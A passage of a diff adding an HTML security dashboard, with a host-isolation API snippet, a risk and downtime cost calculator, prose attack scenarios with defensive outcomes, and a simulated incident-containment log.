+    payload = {
+        <span class="text-terminalRed">"target_ip"</span>: host_ip,
+        <span class="text-terminalRed">"incident_id"</span>: threat_id,
+        <span class="text-terminalRed">"isolation_level"</span>: <span class="text-terminalRed">"Strict"</span>,
+        <span class="text-terminalRed">"terminate_active_sessions"</span>: True
+    }
+    
+    <span class="text-neonBlue">try</span>:
+        response = requests.post(XDR_API_ENDPOINT, json=payload, headers=headers, timeout=10)
+        <span class="text-neonBlue">if</span> response.status_code == 200:
+            print(f<span class="text-sageGreen">"[SUCCESS] Host {host_ip} isolated successfully."</span>)
+            <span class="text-neonBlue">return</span> True
+        <span class="text-neonBlue">else</span>:
+            print(f<span class="text-terminalRed">"[ERROR] Containment API error: {response.status_code}"</span>)
+            <span class="text-neonBlue">return</span> False
+    <span class="text-neonBlue">except</span> Exception as e:
+        print(f<span class="text-terminalRed">"[CRITICAL] Network Exception: {str(e)}"</span>)
+        <span class="text-neonBlue">return</span> False</code></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- TAB 4: INTERACTIVE RISK FINANCIAL MODELER -->
+        <section id="tab-calculator" class="hidden space-y-10">
+            <!-- Header Banner -->
+            <div class="border-b border-borderGray pb-6">
+                <span class="font-mono text-xs text-neonBlue font-bold uppercase tracking-widest">[FINANCIAL CALCULATOR]</span>
+                <h2 class="font-heading font-bold text-3xl md:text-4xl text-neonBlue mt-2">Risk Financial Modeler</h2>
+                <p class="text-base text-terminalText/70 mt-2 font-mono">Calculate Exposure, Annualized Downtime, and Strategic ROI in Real Time</p>
+            </div>
+
+            <!-- Modeler Workspace -->
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+                <!-- Inputs Column -->
+                <div class="lg:col-span-5 space-y-6 bg-lightSlate border border-borderGray p-6 rounded-lg">
+                    <h3 class="font-heading font-semibold text-lg text-white border-b border-borderGray pb-3">Adjust Risk Variables</h3>
+                    
+                    <!-- Input 1 -->
+                    <div class="space-y-2">
+                        <label class="block text-sm font-mono text-white/80">Asset Valuation ($AV$):</label>
+                        <div class="relative">
+                            <span class="absolute left-3 top-2.5 text-terminalText/50 font-mono">$</span>
+                            <input id="input-av" type="number" value="10000000" class="w-full bg-slateNavy border border-borderGray rounded p-2 pl-7 text-white font-mono text-sm focus:border-neonBlue focus:ring-1 focus:ring-neonBlue outline-none" oninput="recalculateModel()">
+                        </div>
+                        <p class="text-xs text-terminalText/50">Total value of core operational and financial data systems.</p>
+                    </div>
+
+                    <!-- Input 2 -->
+                    <div class="space-y-2">
+                        <label class="block text-sm font-mono text-white/80">Exposure Factor ($EF$):</label>
+                        <div class="flex items-center space-x-3">
+                            <input id="input-ef" type="range" min="0" max="1" step="0.05" value="0.45" class="w-full h-1 bg-borderGray rounded-lg appearance-none cursor-pointer accent-neonBlue" oninput="recalculateModel()">
+                            <span id="label-ef" class="font-mono text-sm text-neonBlue w-12 text-right">45%</span>
+                        </div>
+                        <p class="text-xs text-terminalText/50">Estimated percentage of loss during an incident.</p>
+                    </div>
+
+                    <!-- Input 3 -->
+                    <div class="space-y-2">
+                        <label class="block text-sm font-mono text-white/80">Annualized Occurrence ($ARO$):</label>
+                        <input id="input-aro" type="number" step="0.1" value="0.5" class="w-full bg-slateNavy border border-borderGray rounded p-2 text-white font-mono text-sm focus:border-neonBlue focus:ring-1 focus:ring-neonBlue outline-none" oninput="recalculateModel()">
+                        <p class="text-xs text-terminalText/50">Expected frequency of incident attempts in a 12-month period.</p>
+                    </div>
+
+                    <!-- Input 4 -->
+                    <div class="space-y-2">
+                        <label class="block text-sm font-mono text-white/80 font-bold text-terminalRed">Hourly Downtime Cost ($TCO_{hour}$):</label>
+                        <div class="relative">
+                            <span class="absolute left-3 top-2.5 text-terminalText/50 font-mono">$</span>
+                            <input id="input-dt-hour" type="number" value="250000" class="w-full bg-slateNavy border border-borderGray rounded p-2 pl-7 text-white font-mono text-sm focus:border-neonBlue focus:ring-1 focus:ring-neonBlue outline-none" oninput="recalculateModel()">
+                        </div>
+                        <p class="text-xs text-terminalText/50">Cumulative business stoppage cost per hour of system outage.</p>
+                    </div>
+                </div>
+
+                <!-- Outputs Column -->
+                <div class="lg:col-span-7 space-y-6">
+                    <div class="border border-borderGray bg-slateNavy p-6 rounded-lg space-y-6">
+                        <h3 class="font-heading font-semibold text-lg text-neonBlue border-b border-borderGray pb-3">Financial Projections</h3>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <!-- Out 1 -->
+                            <div class="bg-lightSlate p-4 rounded border border-borderGray">
+                                <span class="text-xs font-mono text-terminalText/50 uppercase block">Single Loss Expectancy ($SLE$)</span>
+                                <div id="out-sle" class="text-2xl font-bold font-mono text-white mt-1">$4,500,000</div>
+                                <span class="text-[10px] font-mono text-terminalText/40">Formula: $SLE = AV \times EF$</span>
+                            </div>
+                            <!-- Out 2 -->
+                            <div class="bg-lightSlate p-4 rounded border border-borderGray">
+                                <span class="text-xs font-mono text-terminalText/50 uppercase block">Annualized Loss ($ALE$)</span>
+                                <div id="out-ale" class="text-2xl font-bold font-mono text-white mt-1">$2,250,000</div>
+                                <span class="text-[10px] font-mono text-terminalText/40">Formula: $ALE = SLE \times ARO$</span>
+                            </div>
+                        </div>
+
+                        <!-- Downtime calculations -->
+                        <div class="bg-lightSlate p-5 rounded border border-borderGray">
+                            <div class="flex justify-between items-center mb-3">
+                                <span class="text-sm font-bold text-white uppercase font-heading">48h Outage Cost Estimate</span>
+                                <span class="text-xs font-mono text-terminalRed bg-terminalRed/10 px-2.5 py-0.5 rounded">Ransomware Scenario</span>
+                            </div>
+                            <div id="out-downtime" class="text-3xl font-bold font-mono text-terminalRed">$12,000,000</div>
+                            <p class="text-xs text-terminalText/60 mt-2">
+                                Calculated at $48\text{ consecutive hours}$ of complete system lock before full sandbox restoration occurs.
+                            </p>
+                        </div>
+
+                        <!-- ROI Analysis Block -->
+                        <div class="bg-sageGreen/5 border border-sageGreen/30 p-5 rounded">
+                            <div class="flex items-center space-x-2 text-sageGreen mb-2">
+                                <i class="fa-solid fa-chart-line"></i>
+                                <span class="font-mono text-xs font-bold uppercase">Zero Trust Risk Mitigation Impact</span>
+                            </div>
+                            <p class="text-sm text-terminalText leading-relaxed">
+                                Deploying context-aware policies and phishing-resistant MFA drops effective probability of occurrence ($ARO$) to <strong>&lt; 0.05</strong> and minimizes unmitigated breach impact ($EF$) to <strong>&lt; 5%</strong>.
+                            </p>
+                            <div class="grid grid-cols-2 gap-4 mt-4 pt-4 border-t border-sageGreen/20 text-xs font-mono">
+                                <div>
+                                    <span class="text-terminalText/50">Target State ALE:</span>
+                                    <span id="target-ale" class="block text-sageGreen font-bold text-sm">$25,000</span>
+                                </div>
+                                <div>
+                                    <span class="text-terminalText/50">Net Capital Protected:</span>
+                                    <span id="net-roi" class="block text-sageGreen font-bold text-sm">$2,225,000 / Year</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Modal Notification Component -->
+    <div id="custom-modal" class="hidden fixed inset-0 z-50 bg-slateNavy/80 backdrop-blur-sm flex items-center justify-center p-4">
+        <div class="bg-lightSlate border border-borderGray p-6 rounded-lg max-w-md w-full relative">
+            <h4 id="modal-title" class="font-heading font-bold text-white text-lg">Alert Title</h4>
+            <p id="modal-desc" class="text-sm text-terminalText mt-3">Alert Content</p>
+            <div class="mt-6 flex justify-end">
+                <button onclick="closeModal()" class="bg-neonBlue hover:bg-neonBlue/80 text-slateNavy font-bold px-4 py-2 rounded text-sm transition-all">
+                    Acknowledge
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCRIPTS -->
+    <script>
+        // Global State & Navigation
+        function switchTab(tabId) {
+            // Hide all tabs
+            document.querySelectorAll('main > section').forEach(section => {
+                section.classList.add('hidden');
+            });
+            // Show target tab
+            document.getElementById(tabId).classList.remove('hidden');
+
+            // Reset navigation active state styling
+            document.querySelectorAll('aside nav button').forEach(button => {
+                button.classList.remove('bg-slateNavy', 'border-l-4', 'border-neonBlue', 'text-white');
+                button.classList.add('hover:bg-slateNavy', 'text-terminalText/80', 'hover:text-white');
+                
+                // Reset icon color variable
+                const icon = button.querySelector('i');
+                if (icon) {
+                    icon.classList.remove('text-neonBlue');
+                    icon.classList.add('text-neonBlue/80');
+                }
+            });
+
+            // Mark active button styling
+            const activeBtn = document.getElementById('btn-' + tabId.replace('tab-', ''));
+            if (activeBtn) {
+                activeBtn.classList.remove('hover:bg-slateNavy', 'text-terminalText/80', 'hover:text-white');
+                activeBtn.classList.add('bg-slateNavy', 'border-l-4', 'border-neonBlue', 'text-white');
+                const activeIcon = activeBtn.querySelector('i');
+                if (activeIcon) {
+                    activeIcon.classList.remove('text-neonBlue/80');
+                    activeIcon.classList.add('text-neonBlue');
+                }
+            }
+        }
+
+        // Scenario Assessment Board Interaction
+        function showScenario(id) {
+            const panel = document.getElementById('scenario-panel');
+            const title = document.getElementById('scenario-title');
+            const desc = document.getElementById('scenario-desc');
+            const verdict = document.getElementById('scenario-verdict');
+
+            panel.classList.remove('hidden');
+
+            if (id === 1) {
+                title.innerText = "Scenario 01: Host Identity Harvest Integration";
+                desc.innerText = "Attackers gain direct access to active production databases using domain administrative credentials harvested from local text storage. The user attempts to establish a remote command environment.";
+                verdict.innerHTML = "BLOCKED. Conditional Access rules identified authentication attempts originating from anomalous, unmanaged systems. Identity engine blocked session and required phishing-resistant physical FIDO2 key.";
+            } else if (id === 2) {
+                title.innerText = "Scenario 02: Active Memory Malware Injection";
+                desc.innerText = "A client service triggers execution of an unrecognized user-space scripting payload. The script initiates dynamic memory allocations to map LSASS and execute lateral discovery processes.";
+                verdict.innerHTML = "MITIGATED. Threat analytics on the target machine flagged unauthorized API invocation. Automated local agent triggered memory dump, isolated host network interfaces, and terminated executing process tree within 5 seconds.";
+            } else if (id === 3) {
+                title.innerText = "Scenario 03: Outbound Command Callback";
+                desc.innerText = "A compromised legacy server attempts to communicate with volatile external domains (e.g. .xyz TLDs) associated with dynamic C2 infrastructure.";
+                verdict.innerHTML = "PREVENTED. SASE boundary filtering resolved the host outbound path and compared connection endpoints with real-time threat tables. Outbound request dropped before session handshake initiated.";
+            }
+        }
+
+        // Terminal Interactive Simulation
+        function runTerminalSimulation() {
+            const terminal = document.getElementById('simulation-terminal');
+            terminal.innerHTML = ""; // Clear console log
+            
+            const logs = [
+                { text: "[*] Starting Playbook Core Engine...", delay: 0 },
+                { text: "[*] Initializing telemetry stream with local XDR Agents...", delay: 1000 },
+                { text: "[STATUS] Listening for threat anomalies on subnet [192.168.4.0/24]", delay: 1800 },
+                { text: "<span class='text-terminalRed font-bold'>[ALERT] THREAT DETECTED: Execution of unrated executable payload (Readme_DocuSign.msi)</span>", delay: 3000 },
+                { text: "[ALERT] Context: Process spawned memory injection routine on Host 192.168.4.20", delay: 3800 },
+                { text: "<span class='text-neonBlue'>[*] TRIGGERING MACHINE-SPEED CONTAINMENT POLICY...</span>", delay: 4500 },
+                { text: "[API_CALL] Calling: POST https://api.xdr-shield.local/v2/isolate...", delay: 5200 },
+                { text: "<span class='text-sageGreen'>[SUCCESS] Response 200 OK from local SASE switches.</span>", delay: 6200 },
+                { text: "<span class='text-sageGreen font-bold'>[VERDICT] Host 192.168.4.20 ISOLATED from production VLAN. All outbound channels dropped.</span>", delay: 7000 },
+                { text: "[!] Incident closed. Total Time to Contain (MTTR): 4.1 seconds.", delay: 8000 }
+            ];
+
+            logs.forEach(log => {
+                setTimeout(() => {
+                    const line = document.createElement('div');
+                    line.innerHTML = log.text;
+                    terminal.appendChild(line);
+                    terminal.scrollTop = terminal.scrollHeight; // Auto-scroll
+                }, log.delay);
+            });
+        }
+
+        // Risk Modeler calculations
+        function recalculateModel() {
+            const av = parseFloat(document.getElementById('input-av').value) || 0;
+            const ef = parseFloat(document.getElementById('input-ef').value) || 0;
+            const aro = parseFloat(document.getElementById('input-aro').value) || 0;
+            const dtHour = parseFloat(document.getElementById('input-dt-hour').value) || 0;
+
+            // Slider label update
+            document.getElementById('label-ef').innerText = Math.round(ef * 100) + "%";
+
+            // SLE & ALE
+            const sle = av * ef;
+            const ale = sle * aro;
+            const downtimeTotal = dtHour * 48;
+
+            // Format Currency
+            const formatter = new Intl.NumberFormat('en-US', {
+                style: 'currency',
+                currency: 'USD',
+                maximumFractionDigits: 0
+            });
+
+            document.getElementById('out-sle').innerText = formatter.format(sle);
+            document.getElementById('out-ale').innerText = formatter.format(ale);
+            document.getElementById('out-downtime').innerText = formatter.format(downtimeTotal);
+
+            // Target calculations (Zero Trust lowers EF to ~5% and ARO to ~0.05)
+            const targetEf = 0.05;
+            const targetAro = 0.05;
+            const targetSle = av * targetEf;
+            const targetAleVal = targetSle * targetAro;
+            const netSavings = Math.max(0, ale - targetAleVal);
+
+            document.getElementById('target-ale').innerText = formatter.format(targetAleVal);
+            document.getElementById('net-roi').innerText = formatter.format(netSavings) + " / Year";
+        }
+
+        // Custom Modal UI Control
+        function openModal(title, desc) {
+            document.getElementById('modal-title').innerText = title;
+            document.getElementById('modal-desc').innerText = desc;
+            document.getElementById('custom-modal').classList.remove('hidden');
+        }
+
+        function closeModal() {
+            document.getElementById('custom-modal').classList.add('hidden');
+        }
+
+        // Initialize Modeler
+        window.onload = function() {
+            recalculateModel();
+        }
+    </script>
+</body>
+</html>
